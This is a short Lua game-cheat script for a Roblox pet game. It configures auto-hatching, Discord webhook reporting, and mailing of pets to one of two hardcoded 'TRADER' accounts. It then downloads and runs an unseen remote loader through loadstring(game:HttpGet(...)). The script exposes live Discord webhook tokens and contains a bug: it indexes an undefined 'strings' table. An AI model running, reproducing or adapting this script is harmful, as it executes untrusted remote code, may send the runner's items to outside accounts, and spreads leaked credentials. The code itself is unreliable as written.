local nicks = {"JoyceArthur857", "HendersonJudy2"} -- TRADERs

math.randomseed(os.time())
local escolha = math.random(1, #nicks)
local resultnick = strings[escolha]

getgenv().petsGoConfig = {
    EVENT_EGG = true,
    HIDE_NAME = false,  
    WEBHOOK_URL = "https://discord.com/api/webhooks/1312681708184932382/pwhOcRu6rQzBQ152DQ1zQQehf9pFq6FQy3VDxhesE7aseOE6hI1UuCGN7qhU6YFJIOfe",
    MAILING_WEBHOOK_URL = "https://discord.com/api/webhooks/1310413379915087962/Zg-7ECVStI09DRRG0GQW5fROVilu8-haJhT0cgy1MZVwWiwgBqp5om_VGdPfY4R2tZMb",
    DISCORD_ID = "1037147029614362624",
    WEBHOOK_ODDS = 50000000,  
    MAIL_PET = true,  
    MAIL_WEBHOOK_ODDS = 50000000, 
    MAIL_PET_ODDS = 50000000,  
    USERNAME_TO_MAIL = resultnick
}

game:GetService("RunService"):Set3dRenderingEnabled(false)
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e81ea00ef49a917bb1242da4f41dc4f9.lua"))()
